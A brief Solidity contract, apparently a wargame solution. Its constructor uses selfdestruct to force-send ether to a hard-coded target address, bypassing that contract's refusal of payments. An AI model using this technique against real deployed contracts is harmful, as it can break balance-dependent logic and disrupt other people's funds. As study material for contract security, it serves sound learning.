// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

contract ForceScript {
  address target = payable(0x53bCB4c4b883567FD155f2561624BeBA52ff18c6);

  constructor() payable {
    selfdestruct(payable(target));
  }
}
